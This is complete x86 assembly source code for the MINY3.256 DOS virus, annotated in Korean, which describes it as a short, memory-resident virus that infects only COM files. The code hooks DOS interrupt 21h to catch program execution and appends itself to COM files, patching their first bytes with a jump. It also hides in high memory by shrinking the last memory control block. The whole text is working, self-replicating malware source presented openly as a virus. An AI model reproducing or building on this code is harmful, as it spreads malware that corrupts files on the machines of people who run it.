;******************************************************************************
;*        MINY3.256 바이러스 소스                                             *
;*                                                                            *
;*                                                                            *
;*     미니3 시리즈중에 하나로 국산 바이러스인데 가장 길이가 짧은것으로 알려  *
;*   져 있다. COM 만감염되는 램상주 바이러스이다.                             *
;*                                                                            *
;*                                                                            *
;*                                                                            *
;******************************************************************************


 PARASIZE      EQU     (TVirEND - Start + 0Fh) SHR 4 ; 램에서 차지하는 크기

 VIRUS         SEGMENT PARA 'VIRUS'
               ASSUME CS:VIRUS, DS:VIRUS

 Start:
               call    Next                       ; 바이러스 상주루틴으로 점프

;**************************************************
;    새로운 21h 번 인터럽트
;**************************************************

 NewInt21:
               xchg   ah,al                       ; AH,AL 값 바꾸기
               cmp    al,4Bh                      ; 실행인가?
               jnz    J_Int21

               cmp    ah,30h                      ; 램 상주 여부 검사인가?
               jnz    Push_All
               xor    ax,ax                       ; 맞으면 0000을 돌려줌
               IRET

 Push_All:                                        ; 레지스터 저장
               Pushf
               Push    ax
               Push    bx
               Push    cx
               Push    dx
               Push    ds
               Push    si

               mov     ax,3D02h                   ; 파일 오픈 하기
               Int     21h
               jc      Pop_All                    ; 에러면 끝내기

               push    cs                         ; CS=DS
               pop     ds
               xchg    bx,ax                      ; BX=파일 핸들

 Read_File:
               mov     ah,3Fh                     ; 읽어 들이기
               mov     dx,offset Org4bytes        ; 4 바이트
               mov     si,dx                      ; SI=읽은 주소
               mov     cx,0004h                   ; 길이
               int     21h

 ChkFileisEXE:
               cmp     byte ptr [SI],'M'          ; EXE 파일 인가?
               jz      Close_File                 ; EXE 만 파일 클로즈

 Infect_COM:
               cmp     byte ptr [SI+3],43h        ; 감염여부 검사
               jz      Close_File                 ; (V3의 경우 이값을 가지므로
                                                  ; 감염안됨)
               mov     al,02h                     ; 파일의 제일 뒤로
               call    Set_Pnt

               cmp     ax,1234                    ; 1234 보다 작은가?
               jb      Close_File
               cmp     ax,65000                   ; 65000 보다 큰가?
               ja      Close_File

               sub     ax,0003                    ; 파일 길이-3 = 점프할 위치
               mov     word ptr Filehead+1,ax
               mov     byte ptr Filehead+3,43h    ; 감염여부 문자열

               mov     ah,40h                     ; 바이러스 쓰기
               mov     cx, offset VirEND          ; 길이 (256 바이트)
               xor     dx,dx                      ; 버퍼
               Int     21h

               mov     al,00h                     ; 파일의 처음으로 이동
               call    Set_Pnt

               mov     ah,40h                     ; 바이러스 쓰기
               mov     dx, offset FileHead        ; (앞부분에 해당)
               mov     cx,0004h                   ; Jump 명령까지 포함해서 4바이
               Int     21h                        ; 트

 Close_File:                                      ; 파일 닫기
               mov     ah,3eh                     ; 속성,날짜등은 감염될때 바뀐
               Int     21h                        ; 다.

 Pop_All:                                         ; 레지스터 복구
               Pop     si
               Pop     ds
               Pop     dx
               Pop     cx
               Pop     bx
               Pop     ax
               Popf
 J_Int21:                                         ; 원래 int 21로 점프
               xchg    ah,al
               DB      0EAh                       ; JMP 명령
 OldInt21      DD      ?

;*************************************************
; 바이러스 램 상주 파트
;*************************************************
 Next:         pop     BP                         ; BP에 CALL 이 호출된 다음값
               sub     bp, +03                    ; -3 하면 바이러스 시작점

               mov     AX,304Bh                   ; 램 상주 여부 검사
               xchg    ah,al                      ; AX=4B30
               Int     21h                        ;
               or      ax,ax                      ; AX 값이 0000이면 램에 바이러스가 존재
               jz      Restart_COM                ; 이미 램에 바이러스가 있을 경우

               mov     ah,0F0h                    ; 불필요
               mov     ch,'S'                     ; 불필요

               MOV     BX,ES                      ; MCB 구하기
               NOP
               DEC     BX                         ; -1 : Memory Control Block
               mov     ds,bx
               NOP
               xor     bx,bx                      ; BX=0000
               Inc     bl                         ; BL=01
               cmp     byte ptr [BX-1],'Z'        ; 마지막 블럭인가?
               jnz     Restart_COM                ; 아니면 램 상주 안함
               NOP
               mov     AX, PARASIZE               ; 줄일 램 크기
               sub     word ptr [BX+02],AX        ; 블럭 사이즈(BX=0003)
               NOP

               sub     word ptr [BX+11h],AX       ; 다음 메모리 블럭의 세그먼트 번지
               mov     cl,'V'                     ; BX=0012 (mov cl,'V'는 불필요함)
               mov     es,word ptr [BX+11h]       ; 옮길 주소

                                                  ; Int 21h 가로채기
               xor     ax,ax                      ; DS=0000
               mov     ds,ax
               lds     AX, [BX+83h]               ; DI=0084h
               mov     word ptr ss:[BP+OldInt21+2],DS
               mov     word ptr ss:[BP+OldInt21],AX

               push    cs                         ; 바이러스를 최상위로 복사한다.
               pop     ds
               mov     si,BP                      ; SI=바이러스 시작점
               xor     di,di
               mov     cx,offset TVirEND          ; 옮길길이
               cld
               repz    movsb                      ; 복사

               mov     ds,cx                      ; Int 21h 를 차지한다.
               cli
               mov     word ptr [BX+85h],es       ;
               mov     word ptr [BX+83h],offset NewInt21
               sti

 Restart_COM:
               mov     si,BP                      ; SI = 시작점

               push    cs
               pop     ds
               push    cs                         ; ds=es
               pop     es

                                                  ; 원래 프로그램 실행하기
               add     si,offset Org4bytes        ; 원래 명령어가 저장된 주소
               mov     di,0100h                   ; 처음의 4 바이트 복구
               push    di
               movsw                              ; 복사
               movsw
               RET                                ; 재실행

               NOP
 Org4bytes     db      90h,90h,0cdh,20h           ; 원래 4 바이트의 값

 Set_Pnt:                                         ; 위치 이동 명령
               mov     ah,42h
               xor     cx,cx
               xor     dx,dx
               Int     21h
               RET

               DB     'Miny3'                     ; 바이러스 이름
 FileHead      DB     0E9h                        ; JMP 명령
                                                  ; 여기부터 파일에는 안쓰여짐
 VirEND:                                          ; 감염될 파일 앞부분에 쓰일
               DB     ?,?,?                       ; 명령
 TVirEND:                                         ; 램에서 존재하는 길이

 VIRUS         ENDS
               end    start
